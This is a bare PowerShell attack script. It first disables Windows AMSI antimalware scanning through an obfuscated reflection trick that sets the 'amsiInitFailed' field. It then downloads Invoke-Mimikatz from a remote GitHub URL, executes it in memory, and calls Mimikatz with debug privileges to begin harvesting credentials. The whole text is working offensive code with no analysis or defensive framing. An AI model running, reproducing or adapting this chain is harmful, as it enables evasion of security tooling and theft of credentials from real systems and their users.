$a =[Ref].Assembly.GetType('System.Management.Automation.AmsiUt'+'ils')
$h="4456625220575263174452554847" 
$s =[string](0..13|%{[char][int](53+($h).substring(($_*2),2))})-replace " " 
$b =$a.GetField($s,'NonPublic,Static') 
$b.SetValue($null,$true)
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/sharp-shooter/research/master/code/mimikatz/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug coffee"